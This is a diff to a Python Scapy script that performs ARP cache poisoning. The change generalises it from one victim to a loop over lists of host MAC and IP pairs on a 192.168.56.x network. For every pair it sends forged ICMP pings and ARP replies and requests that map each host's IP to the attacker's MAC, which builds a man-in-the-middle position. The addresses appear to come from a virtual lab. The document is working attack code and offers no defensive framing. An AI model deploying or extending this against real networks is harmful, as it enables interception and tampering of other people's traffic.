@@ -23,7 +23,8 @@ poison_thread = 0
 poison_confirm_thread = 0
 read_packets_thread = 0
 
-
+victims1 = [("08:00:27:b7:c4:af", "192.168.56.101"), ("08:00:27:cc:08:6f", "192.168.56.102")]
+victims2 = [("08:00:27:b7:c4:af", "192.168.56.101"), ("08:00:27:cc:08:6f", "192.168.56.102")]
 
 macVictim = "08:00:27:b7:c4:af"
 ipVictim = "192.168.56.101"
@@ -74,14 +75,20 @@ def arp_poison():
     
     print("[*] Sending ARP poison packets...")
     
-    icmp = forge_l2_ping(ipToSpoof, ipVictim, macVictim)
-    sendp(icmp, iface="enp0s3")
+    for victimAdr in victims1:
+        for spoofAdr in victims2:
+            if(victimAdr == spoofAdr):
+                continue
+            icmp = forge_l2_ping(spoofAdr[1], victimAdr[1], victimAdr[0])
+            sendp(icmp, iface="enp0s3")
 
-    arp = forge_arp(ipToSpoof, ipVictim, macVictim, ATTACKER_MAC, 2)
-    sendp(arp, iface="enp0s3")
+            arp = forge_arp(spoofAdr[1], victimAdr[1], victimAdr[0], ATTACKER_MAC, 2)
+            sendp(arp, iface="enp0s3")
 
-    arp[ARP].op = 1
-    sendp(arp, iface="enp0s3") 
+            arp[ARP].op = 1
+            sendp(arp, iface="enp0s3") 
+            
+    
 
     print("[*] end of ARP storm...")
 
